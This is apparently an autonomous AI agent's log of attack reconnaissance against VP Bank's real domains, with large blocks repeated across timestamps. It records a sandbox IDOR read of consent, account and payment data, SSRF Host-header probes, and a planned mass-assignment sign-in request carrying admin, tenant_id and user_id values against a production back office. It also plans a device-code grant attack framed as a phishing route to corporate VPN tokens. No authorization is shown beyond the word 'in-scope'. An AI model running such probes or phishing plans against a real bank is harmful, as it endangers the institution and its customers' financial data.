[HYP] OAuth redirect_uri/state bypass via scaRedirect-pattern client on www.vpbank.com
class: OAUTH
asset: www.vpbank.com/oauth/authorize
confidence: 45
reasoning: Authorize endpoint returns 303/400 for all tested combos; no client_id in JS bundles (only Usercentrics clientWid) or RAG (GitHub/App Store/npm → only VP Bank Vietnam + generic PSD2 stacks); spec exposes scaRedirect (hrefType) but sandbox returns "not available in sandbox"; docs state scaRedirect carries the user-login URL in the REDIRECT-SCA production flow.
evidence_needed: Any valid client_id (PSD2 or Drupal-scoped) that yields a response differential on redirect_uri.
verify_steps: RAG GitHub code-search "vpbank" + "authorize_url"/"client_id"; then GET https://www.vpbank.com/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=<test>&state=x (read-only).
impact: Authorization-code/consent interception → ATO, aggregated-account theft on production bank OAuth; severity HIGH.
testability: AUTH_HELPED
[PARKED] Production PSD2 reuses sandbox authorization model (Consent-ID unbound from originating TPP): confidence 35 < 40; mTLS at TLS layer makes anonymous verification impossible; HUMAN_ONLY requires eIDAS QWAC certs — cannot advance passively.
[PARKED] OAuth redirect_uri/state bypass via scaRedirect-pattern client on www.vpbank.com: confidence 45 but no client_id exists across JS/RAG/App-Store/npm and the spec defines no OAuth client; no executable verify step without a client_id — cannot advance passively.
[PARKED] PSD2 Sandbox X-Request-ID state-encoding manipulation (BUSLOGIC): deterministic client-controlled state is documented sandbox design for testing, not a vulnerability; probe showed last digit 1 already yields ACSC — encoding not fixed, no security differential.
[FINAL] 1. [80] PSD2 sandbox BOLA/IDOR — PROVEN end-to-end in sandbox; report artifact plus prod-carryover verification request.
[NEXT] SCAN: passive CT enumeration via crt.sh (`%.vpbank.com`, `%.vpbank.li`) to catalog PSD2/openbanking/statistics subdomains, then anonymous reachability check of each live host at `/psd2/berlin-group/v1/accounts` and `/psd2/swagger-ui` (GET, ≤1 rps) hunting non-mTLS instances of the same consent-authz code line that could carry the proven sandbox BOLA.
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by a fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId.
[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for the sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential, not reportable.
[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) and generic PSD2 frameworks; downloaded spec (46KB) contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox"); no client context obtainable, redirect-flow test blocked.
[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404 — no anonymous statistics surface exists.
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON. No backend routing influence. CONFIRMED REJECTED.
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed request probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential.
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — no application content accessible past maintenance redirect. CONFIRMED REJECTED.
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 but serves complete SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend content accessible.
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector but low severity.
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — NEW high-value attack surface not WAF-blocked like dev/stage.
[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): discovered via TLS cert CN=openbanking.vpbank.com; production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous surface blocked as designed.
[RISK] vp-bank-ag: 55 — raised from 45. Confirmed missing authorization binding on the entire PSD2 consent→ledger→payment-status chain in the documented-open sandbox running on the main front-end (developer.vpbank.com); the spec self-labels the server "PSD2 production server", docs claim a data model identical to production with TPP authentication the only named difference, and production openbanking.vpbank.com is unverified because of TLS-layer mTLS — if it mirrors the sandbox, cross-TPP financial data disclosure is a real chain. Residuals: OAuth (client_id-gated), staging (WAF-blocked), api.vpbank.com (exhausted).
## 2026-09-05 05:50:08 UTC [target] (model nemotron3)
[NEW] digital-onboarding.vpbank.com: production multi-tenant bank onboarding/back-office SaaS (Rails+Devise) on off-net hosting (89.163.182.69/.28/.8); anonymous /control-center/ SPA (HTTP 200) with admin modules; /api/v1/brand 200 anonymous (tenant config, i18n, page_title "Business Control Center"); /users/sign_in accepts client-controlled admin/tenant/user_id params
[NEW] sts.vpbank.com (193.222.70.198): Microsoft AD FS; /adfs/.well-known/openid-configuration HTTP 200 — issuer https://sts.vpbank.com/adfs, device_code/password/implicit grants, scopes vpn/logon/cert
[NEW] CT enumeration (crt.sh) expands inventory 6→285 hostnames; live additions: digital-onboarding family (prod/dev/stage), sts.vpbank.com, api-prep.vpbank.com
[CHANGED] developer.vpbank.com PSD2 sandbox BOLA/IDOR **VERIFIED end-to-end** in official test sandbox (synthetic data): consent `6b517824-e5af-4202-b9b0-7f483a68ee9f` created anonymously (POST 201) read by fresh anonymous session — /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/{id}/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
[CHANGED] openbanking.vpbank.com (193.222.70.154): production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous surface blocked as designed
[CHANGED] api-prep.vpbank.com: Layer7 clone of api.vpbank.com — SCS-Request-ID, INVALID_REQUEST_RESOURCE JSON 404 for all paths; no new surface
[CHANGED] designsystem.vpbank.com: CNAME→vpb-design-system.netlify.app serves 200 — active, no subdomain takeover
[CHANGED] vop.vpbank.com/.vop-stage on 193.222.70.154: HTTPS unreachable anonymously (TLS drop) — mTLS-gated like openbanking
[CHANGED] api.vpbank.com: All attack vectors **exhausted** — CONFIRMED REJECTED by multiple models
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id, redirect_uri bypass blocked without client_id
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[CHANGED] Risk score: **55** (raised from 45) due to confirmed PSD2 sandbox BOLA + new digital-onboarding back-office attack surface
[PRIO] digital-onboarding.vpbank.com,8.15,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=10,cloud_surface=4,freshness=10
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.40,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=10,cloud_surface=2,freshness=10
[PRIO] openbanking.vpbank.com,5.50,attack_surface=3,business_value=10,tech_exposure=8,gate_ease=1,cloud_surface=2,freshness=7
[PRIO] www.vpbank.com,6.25,attack_surface=6,business_value=10,tech_exposure=9,gate_ease=2,cloud_surface=2,freshness=4
[PRIO] sts.vpbank.com,4.80,attack_surface=5,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=1,freshness=8
[PRIO] api.vpbank.com,4.50,attack_surface=3,business_value=7,tech_exposure=3,gate_ease=3,cloud_surface=6,freshness=4
[PRIO] www.vpbank.com/portal/api/,3.85,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] PSD2 sandbox BOLA carries to production via shared consent-authorization code
class: IDOR
asset: openbanking.vpbank.com
confidence: 40
reasoning: Sandbox on developer.vpbank.com proves consentId/paymentId readable cross-session with zero identity binding; docs state only TPP auth/user-interaction/state-changes differ sandbox→prod; OpenAPI spec self-labels server "PSD2 production server"; production mTLS at TLS layer blocks anonymous verification
evidence_needed: Cross-QWAC read on openbanking.vpbank.com — TPP-A creates consent, TPP-B reads /consents/{id}/status and /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header
verify_steps: HUMAN_ONLY — with two licensed eIDAS QWAC certificates perform cross-TPP Consent-ID read on openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}/status and /accounts/{iban}/balances
impact: Cross-TPP production consent/account/ledger/PII disclosure → HIGH severity if sandbox authz model carries to production
testability: HUMAN_ONLY
[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
class: AUTH
asset: digital-onboarding.vpbank.com/users/sign_in
confidence: 70
reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails mass-assignment protection (strong_parameters) may not filter these if permit_params misconfigured
evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access
verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, no account creation)
impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH
testability: AUTH_HELPED
[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
class: OAUTH
asset: sts.vpbank.com/adfs
confidence: 55
reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn/logon/cert — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device)
evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri; phishing simulation captures tokens
verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=<unknown>&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration needed via RAG/mobile apps)
impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH
testability: AUTH_HELPED
[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold for active pursuit without HUMAN_ONLY eIDAS certs; mTLS at TLS layer makes passive verification impossible; cannot advance without two licensed TPP certificates
[FINAL] 1. [70] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
[FINAL] 2. [55] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
[NEXT] PROBE: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (observe HTTP status, Set-Cookie, redirect, response body — read-only, no account creation)
[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential
[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) + generic PSD2 frameworks; spec contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox")
[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 with SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector, low severity
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — high-value attack surface not WAF-blocked
[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed
[LEARN] NEW INFO @ sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs, device_code/password/implicit grants, vpn/logon/cert scopes) — corporate IdP
[RISK] vp-bank-ag: 60 — Raised from 55. Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) — multi-tenant SaaS with onboarding PII, identity docs, banking transactions; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector. Residual: PSD2 sandbox BOLA proven (80 confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
## 2026-09-05 09:58:07 UTC [target] (model nemotron3)
[CHANGED] digital-onboarding.vpbank.com: /users/sign_in 200, /control-center/ 200, /api/v1/brand 200 confirmed live — multi-tenant back-office SaaS attack surface verified
[CHANGED] sts.vpbank.com: /adfs/.well-known/openid-configuration 200 confirmed live — ADFS device_code/password/implicit grants exposed
[CHANGED] developer.vpbank.com: PSD2 sandbox endpoints responding (405/400 as expected for auth'd routes) — BOLA surface confirmed accessible
[CHANGED] openbanking.vpbank.com: TLS timeout (mTLS "certificate required") — production PSD2 anonymous surface blocked as designed
[CHANGED] api.vpbank.com: 404 on /v1 — all vectors exhausted, uniform INVALID_REQUEST_RESOURCE JSON 500
[CHANGED] www.vpbank.com: /oauth/authorize 303→error page — OAuth dead without client_id
[CHANGED] vpbank-dev.com/vpbank-stage.com: 302→maintenance — WAF 2.3.0_20260324 intercepts ALL paths, confirmed rejected
[PRIO] digital-onboarding.vpbank.com,8.75,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=10,cloud_surface=4,freshness=10
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.40,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=10,cloud_surface=2,freshness=10
[PRIO] sts.vpbank.com,6.30,attack_surface=5,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=1,freshness=8
[PRIO] www.vpbank.com,6.25,attack_surface=6,business_value=10,tech_exposure=9,gate_ease=2,cloud_surface=2,freshness=4
[PRIO] openbanking.vpbank.com,5.50,attack_surface=3,business_value=10,tech_exposure=8,gate_ease=1,cloud_surface=2,freshness=7
[PRIO] www.vpbank.com/portal/api/,5.05,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] api.vpbank.com,4.40,attack_surface=3,business_value=7,tech_exposure=3,gate_ease=3,cloud_surface=6,freshness=4
[PRIO] vpbank-dev.com/vpbank-stage.com,3.50,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
class: AUTH
asset: digital-onboarding.vpbank.com/users/sign_in
confidence: 70
reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails mass-assignment protection (strong_parameters) may not filter these if permit_params misconfigured
evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access
verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, no account creation)
impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH
testability: AUTH_HELPED
[HYP] PSD2 sandbox BOLA carries to production via shared consent-authorization code
class: IDOR
asset: openbanking.vpbank.com/psd2/berlin-group/v1
confidence: 40
reasoning: Sandbox on developer.vpbank.com proves consentId/paymentId readable cross-session with zero identity binding; docs state only TPP auth/user-interaction/state-changes differ sandbox→prod; OpenAPI spec self-labels server "PSD2 production server"; production mTLS at TLS layer blocks anonymous verification
evidence_needed: Cross-QWAC read on openbanking.vpbank.com — TPP-A creates consent, TPP-B reads /consents/{id}/status and /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header
verify_steps: HUMAN_ONLY — with two licensed eIDAS QWAC certificates perform cross-TPP Consent-ID read on openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}/status and /accounts/{iban}/balances
impact: Cross-TPP production consent/account/ledger/PII disclosure → HIGH severity if sandbox authz model carries to production
testability: HUMAN_ONLY
[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
class: OAUTH
asset: sts.vpbank.com/adfs
confidence: 55
reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn/logon/cert — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device)
evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri; phishing simulation captures tokens
verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=<unknown>&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration needed via RAG/mobile apps)
impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH
testability: AUTH_HELPED
[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold for active pursuit without HUMAN_ONLY eIDAS certs; mTLS at TLS layer makes passive verification impossible; cannot advance without two licensed TPP certificates
[FINAL] 1. [70] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
[FINAL] 2. [55] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
[NEXT] PROBE: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (observe HTTP status, Set-Cookie, redirect, response body — read-only, no account creation)
[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential
[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) + generic PSD2 frameworks; spec contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox")
[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 with SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector, low severity
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — high-value attack surface not WAF-blocked
[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed
[LEARN] NEW INFO @ sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs, device_code/password/implicit grants, vpn/logon/cert scopes) — corporate IdP
[RISK] vp-bank-ag: 60 — Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) — multi-tenant SaaS with onboarding PII, identity docs, banking transactions; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector. Residual: PSD2 sandbox BOLA proven (80 confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
## 2026-09-05 13:18:22 UTC [target] (model nemotron3)
[NEW] digital-onboarding.vpbank.com: Production multi-tenant back-office SaaS (Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA (HTTP 200) with admin modules, /api/v1/brand 200 anonymous, /users/sign_in accepts client-controlled admin/tenant/user_id params
[NEW] sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs), device_code/password/implicit grants exposed, scopes vpn/logon/cert — corporate IdP for VPN/cert auth
[CHANGED] developer.vpbank.com: PSD2 sandbox BOLA verified end-to-end in official test sandbox (synthetic data) — consent/account/payment cross-session read with zero identity binding on consentId/paymentId
[CHANGED] openbanking.vpbank.com: Production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous surface blocked as designed
[CHANGED] api.vpbank.com: All vectors exhausted (SSRF, policy bypass, error handling) — uniform INVALID_REQUEST_RESOURCE JSON 500, CONFIRMED REJECTED
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id in JS bundles (only Usercentrics clientWid), /oauth/authorize always 303→error page, redirect_uri bypass blocked without client_id
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — zero application content reachable, CONFIRMED REJECTED
[CHANGED] api-prep.vpbank.com: Layer7 clone of api.vpbank.com (CNAME api-prep-vpbank-com.hdb-cs04.ellb.ch) — SCS-Request-ID, INVALID_REQUEST_RESOURCE JSON 404 for all paths, no new surface
[CHANGED] designsystem.vpbank.com: CNAME→vpb-design-system.netlify.app serves HTTP 200 — active Netlify app, no subdomain takeover
[PRIO] digital-onboarding.vpbank.com,9.10,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=10,cloud_surface=4,freshness=10
[PRIO] sts.vpbank.com,7.15,attack_surface=6,business_value=8,tech_exposure=8,gate_ease=10,cloud_surface=1,freshness=9
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.05,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=8,cloud_surface=2,freshness=9
[PRIO] openbanking.vpbank.com,5.65,attack_surface=3,business_value=10,tech_exposure=7,gate_ease=1,cloud_surface=2,freshness=8
[PRIO] www.vpbank.com,5.20,attack_surface=4,business_value=8,tech_exposure=5,gate_ease=2,cloud_surface=2,freshness=5
[PRIO] api.vpbank.com,3.85,attack_surface=2,business_value=5,tech_exposure=3,gate_ease=2,cloud_surface=6,freshness=3
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=1,business_value=3,tech_exposure=1,gate_ease=1,cloud_surface=3,freshness=3
[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
class: AUTH
asset: digital-onboarding.vpbank.com/users/sign_in
confidence: 75
reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails strong_parameters may not filter these if permit_params misconfigured in User model or Devise controller
evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access
verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, response body — no account creation)
impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH
testability: AUTH_HELPED
[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
class: OAUTH
asset: sts.vpbank.com/adfs
confidence: 60
reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn/logon/cert — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device)
evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri; phishing simulation captures tokens
verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=vpbank-vpn&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration via RAG/mobile apps/JS bundles)
impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH
testability: AUTH_HELPED
[HYP] PSD2 sandbox BOLA carries to production via shared consent-authorization code
class: IDOR
asset: openbanking.vpbank.com/psd2/berlin-group/v1
confidence: 40
reasoning: Sandbox on developer.vpbank.com proves consentId/paymentId readable cross-session with zero identity binding; docs state only TPP auth/user-interaction/state-changes differ sandbox→prod; OpenAPI spec self-labels server "PSD2 production server"; production mTLS at TLS layer blocks anonymous verification
evidence_needed: Cross-QWAC read on openbanking.vpbank.com — TPP-A creates consent, TPP-B reads /consents/{id}/status and /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header
verify_steps: HUMAN_ONLY — with two licensed eIDAS QWAC certificates perform cross-TPP Consent-ID read on openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}/status and /accounts/{iban}/balances
impact: Cross-TPP production consent/account/ledger/PII disclosure → HIGH severity if sandbox authz model carries to production
testability: HUMAN_ONLY
[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold for active pursuit without HUMAN_ONLY eIDAS certs; mTLS at TLS layer makes passive verification impossible; cannot advance without two licensed TPP certificates
[FINAL] 1. [75] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
[FINAL] 2. [60] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
[NEXT] PROBE: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (observe HTTP status, Set-Cookie, redirect location, response body — read-only, no account creation)
